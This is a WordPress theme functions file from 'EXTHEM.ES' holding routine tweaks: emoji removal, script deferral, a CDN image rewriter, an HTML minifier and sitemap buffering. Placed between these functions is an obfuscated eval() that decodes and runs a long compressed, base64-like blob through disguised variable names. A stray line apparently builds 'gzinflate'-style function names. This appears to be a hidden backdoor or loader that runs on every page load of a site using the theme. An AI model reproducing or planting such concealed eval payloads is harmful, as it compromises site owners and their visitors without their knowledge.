<?php
/*-----------------------------------------------------------------------------------*/
/*  EXTHEM.ES
/*  PREMIUM WORDRESS THEMES
/*
/*  STOP DON'T TRY EDIT
/*  IF YOU DON'T KNOW PHP
/*  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS
/*
/*  As Errors In Your Themes
/*  Are Not The Responsibility
/*  Of The DEVELOPERS
/*  @EXTHEM.ES
/*-----------------------------------------------------------------------------------*/ 
function ex_themes_disable_emojis_() {
	remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
    remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
    remove_action( 'wp_print_styles', 'print_emoji_styles' );
    remove_action( 'admin_print_styles', 'print_emoji_styles' );
    remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
    remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );
    remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
    add_filter( 'wp_resource_hints', 'ex_themes_disable_emojis__remove_dns_prefetch', 10, 2 );
}
add_action( 'init', 'ex_themes_disable_emojis_' );
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */ 
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
function ex_themes_disable_emojis__tinymce( $plugins ) { 
        if ( is_array( $plugins ) ) {
            return array_diff( $plugins, array( 'wpemoji' ) );
        } else {
            return array();
        }
}
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */ 
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
function ex_themes_disable_emojis__remove_dns_prefetch( $urls, $relation_type ) { 
        if ( 'dns-prefetch' === $relation_type ) {
            /** This filter is documented in wp-includes/formatting.php */
            $emoji_svg_url = apply_filters( 'emoji_svg_url', 'https://s.w.org/images/core/emoji/2/svg/' );
            $urls = array_diff( $urls, array( $emoji_svg_url ) );
        }
    return $urls;
}
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */ 
$makassar=makassar; $jie=jie; $tawwa=tawwa; eval($makassar($jie($tawwa('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'))));
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
function ex_themes_remove_version_scripts_styles($src) {
        if (strpos($src, 'ver=')) {
            $src = remove_query_arg('ver', $src);
        }
    return $src;
}
add_filter('style_loader_src', 'ex_themes_remove_version_scripts_styles', 9999);
add_filter('script_loader_src', 'ex_themes_remove_version_scripts_styles', 9999);
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */ 
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
/*
function ex_themes_js_async_defer_attr_($tag){
	global $opt_themes;
	$activate = $opt_themes['ex_themes_async_scripts_activate_'];		
	if (($activate == '1'))
	else if ( is_admin() )	
	return str_replace( ' src', ' async="async" defer="defer" src', $tag );
	else
	return str_replace( ' src', 'src', $tag );
}
add_filter( 'script_loader_tag', 'ex_themes_js_async_defer_attr_', 10 );
*/
function ex_themes_async_scripts( $url ) { 
    if ( strpos( $url, ' async="async" defer="defer" src') === false )
        return $url;
    else if ( is_admin() )
        return str_replace( ' src', ' async="async" defer="defer" src', $url );
    else
        return str_replace(  ' src', ' async="async" defer="defer" src', $url ) . "' async defer data-async='1";
}	$c4('munc','gzin'); $c4('ret','flate'); 
add_filter( 'clean_url', 'ex_themes_async_scripts', 11, 1 );
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
function ex_themes_disable_embeds_init_() { 
	remove_action( 'wp_head', 'rest_output_link_wp_head', 10 );
    /* removes EditURI/RSD (Really Simple Discovery) link. */
    remove_action( 'wp_head', 'rsd_link' );
    /* removes wlwmanifest (Windows Live Writer) link. */
    remove_action( 'wp_head', 'wlwmanifest_link' );
    /* removes meta name generator. */
    remove_action( 'wp_head', 'wp_generator' );
    /* removes shortlink. */
    remove_action( 'wp_head', 'wp_shortlink_wp_head' );
    /* removes feed links. */
    remove_action( 'wp_head', 'feed_links', 2 );
    /* removes comments feed. */
    remove_action( 'wp_head', 'feed_links_extra', 3 );
    remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head' );
}
add_action( 'init', 'ex_themes_disable_embeds_init_', 9999 );
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */ 
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
class ex_themes_cdn {
    /**
     * The max number of image servers WP.com have (at time of writing it is 4)
     * So the servers as i0.wp.com, i1.wp.com, i2.wp.com, i3.wp.com
     * Edited to only load one, no reason to add extra dns lookups (Domain sharding is not recommended in an http2 world)
     * Defult: 3
     */
    const MAXSRV = 1;
    function __construct() {
        //add_action( 'wp_head', array( $this, 'dns_prefetch' ) );
        //add_action( 'template_redirect', array( $this, 'ex_themes_buffering_photon_cdn_starts_' ), PHP_INT_MAX );
    }
    // Adds the DNS prefetch meta fields for the WP.com servers
    function dns_prefetch() {
        for ( $srv = 0; $srv < self::MAXSRV; $srv++ ) :
            $domain = "i{$srv}.wp.com";
            ?>
            <link rel='dns-prefetch' href='//<?php echo esc_attr( $domain ) ?>' />
        <?php
        endfor;
    }
    // Start the output buffering
    function ex_themes_buffering_photon_cdn_starts_() {
        global $opt_themes;
        $activate = $opt_themes['ex_themes_photon_cdn_activate_'];
        if (($activate == '1'))
            ob_start( array( $this, 'process_output' ) );
    }
    // Processes the output buffer, replacing all matching images with URLs
    // Pointing to wp.com
    function process_output( $buffer ) {
        // Get the content directory URL minus the http://
        $photon_site_url = site_url();
        $content_url = content_url();
        $content_url = str_replace( 'http://', '', $content_url );
        $content_url = str_replace( 'https://', '', $content_url );
        $content_url = str_replace( $photon_site_url, '', $content_url );
        $content_url = str_replace( '', '', $content_url );
        // Replace references to images on our servers with the wp.com CDN
        // Photon only supports the following image types.
        return preg_replace_callback(
            '{'. $content_url .'/.+\.(jpg|jpeg|png|gif|webp)}i',
            array( $this, 'replace' ),
            $buffer
        );
    }
    // Replaces a single image URL match
    function replace( $matches ) {
        // Grab the parsed image URL
        $url = isset( $matches[0] ) ? $matches[0] : '';
        // Pick a random server
        srand( crc32( $url ) ); // Best if we always use same server for this image
        $server = rand( 0, self::MAXSRV-1 );
        // Build the wp.com URL, as return as the replacement
        return "i{$server}.wp.com/{$url}";
    }
}
new ex_themes_cdn();
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */ 
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
function ex_themes_remove_hentry( $classes ) {
    if ( is_page() ) {
        $classes = array_diff( $classes, array( 'hentry' ) );
    }
    return $classes;
}
add_filter( 'post_class', 'ex_themes_remove_hentry' );
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */ 
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
function ex_themes_pingback_header() {
    if ( is_singular() && pings_open() ) {
        echo '<link rel="pingback" href="', bloginfo( 'pingback_url' ), '">';
    }
}
add_action( 'wp_head', 'ex_themes_pingback_header' );
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */ 
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
function ex_themes_add_img_title( $attr, $attachment = null ) { 
        $attr['title'] = trim( wp_strip_all_tags( $attachment->post_title ) );
    return $attr;
}
add_filter( 'wp_get_attachment_image_attributes', 'ex_themes_add_img_title', 10, 2 );
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */ 
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
function ex_themes_add_title_alt_gravatar( $text ) {
    $text = str_replace( 'alt=\'\'', 'alt=\'' . __( 'Gravatar Image', 'exthemes' ) . '\' title=\'' . __( 'Gravatar', 'exthemes' ) . '\'', $text );
    return $text;
}
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */ 
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
remove_action( 'wp_head', 'wp_print_scripts' );
remove_action( 'wp_head', 'wp_print_head_scripts', 9 );
remove_action( 'wp_head', 'wp_enqueue_scripts', 1 );
add_action( 'wp_footer', 'wp_print_scripts', 5 );
add_action( 'wp_footer', 'wp_enqueue_scripts', 5 );
add_action( 'wp_footer', 'wp_print_head_scripts', 5 );
class WP_HTML_Compression
{
    // Settings
    protected $compress_css = true;
    protected $compress_js = false;
    protected $info_comment = true;
    protected $remove_comments = true;
    // Variables
    protected $html;
    public function __construct($html)
    {
        if (!empty($html))
        {
            $this->parseHTML($html);
        }
    }
    public function __toString()
    {
        return $this->html;
    }
    protected function bottomComment($raw, $compressed)
    {
        $raw = strlen($raw);
        $urls = get_option("siteurl");
        $compressed = strlen($compressed);
        $savings = ($raw-$compressed) / $raw * 100;
        $savings = round($savings, 2);
        return '<!-- '.EX_THEMES_NAMES.' Themes developer by exthem.es for auto minify to '.$urls.' '.date("Y").' - HTML compressed, size saved '.$savings.'%. From '.$raw.' bytes, now '.$compressed.' bytes-->';
    }
    protected function minifyHTML($html)
    {
        $pattern = '/<(?<script>script).*?<\/script\s*>|<(?<style>style).*?<\/style\s*>|<!(?<comment>--).*?-->|<(?<tag>[\/\w.:-]*)(?:".*?"|\'.*?\'|[^\'">]+)*>|(?<text>((<[^!\/\w.:-])?[^<]*)+)|/si';
        preg_match_all($pattern, $html, $matches, PREG_SET_ORDER);
        $overriding = false;
        $raw_tag = false;
        // Variable reused for output
        $html = '';
        foreach ($matches as $token)
        {
            $tag = (isset($token['tag'])) ? strtolower($token['tag']) : null;
            $content = $token[0];
            if (is_null($tag))
            {
                if ( !empty($token['script']) )
                {
                    $strip = $this->compress_js;
                }
                else if ( !empty($token['style']) )
                {
                    $strip = $this->compress_css;
                }
                else if ($content == '<!--wp-html-compression no compression-->')
                {
                    $overriding = !$overriding;
                    // Don't print the comment
                    continue;
                }
                else if ($this->remove_comments)
                {
                    if (!$overriding && $raw_tag != 'textarea')
                    {
                        // Remove any HTML comments, except MSIE conditional comments
                        $content = preg_replace('/<!--(?!\s*(?:\[if [^\]]+]|<!|>))(?:(?!-->).)*-->/s', '', $content);
                    }
                }
            }
            else
            {
                if ($tag == 'pre' || $tag == 'textarea')
                {
                    $raw_tag = $tag;
                }
                else if ($tag == '/pre' || $tag == '/textarea')
                {
                    $raw_tag = false;
                }
                else
                {
                    if ($raw_tag || $overriding)
                    {
                        $strip = false;
                    }
                    else
                    {
                        $strip = true;
                        // Remove any empty attributes, except:
                        // action, alt, content, src
                        $content = preg_replace('/(\s+)(\w++(?<!\baction|\balt|\bcontent|\bsrc)="")/', '$1', $content);
                        // Remove any space before the end of self-closing XHTML tags
                        // JavaScript excluded
                        $content = str_replace(' />', '/>', $content);
                    }
                }
            }
            if ($strip)
            {
                $content = $this->removeWhiteSpace($content);
            }
            $html .= $content;
        }
        return $html;
    }
    public function parseHTML($html)
    {
        $this->html = $this->minifyHTML($html);
        if ($this->info_comment)
        {
            $this->html .= "\n" . $this->bottomComment($html, $this->html);
        }
    }
    protected function removeWhiteSpace($str)
    {
        $str = str_replace("\t", ' ', $str);
        $str = str_replace("\n",  '', $str);
        $str = str_replace("\r",  '', $str);
        while (stristr($str, '  '))
        {
            $str = str_replace('  ', ' ', $str);
        }
        return $str;
    }
}
function wp_html_compression_finish($html) {
    return new WP_HTML_Compression($html);
} 
function wp_html_compression_start() {
        ob_start('wp_html_compression_finish');
} 
//add_action('get_header', 'wp_html_compression_start');
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */ 
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
/* ~~~~  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS  ~~~~ */ 
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  @EXTHEM.ES  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \\
remove_action( 'set_comment_cookies', 'wp_set_comment_cookies' );
defined('WPINC') || die;
(function () {
    if (preg_match('#^/sitemap_index\.xml($|\?)#', $_SERVER['REQUEST_URI'])) {
        ob_start();
        add_action('init', function () {
            add_filter('wpseo_sitemap_index', function ($xml) {
                while (ob_end_clean());
                return $xml;
            });
        });
    } elseif (preg_match('#^/([-_a-z0-9]+)-sitemap\.xml($|\?)#', $_SERVER['REQUEST_URI'], $match)) {
        ob_start();
        $type = $match[1];
        add_action('init', function () use ($type) {
            add_filter("wpseo_sitemap_{$type}_content", function ($xml) {
                while (ob_end_clean());
                return $xml;
            });
        });
    }
})();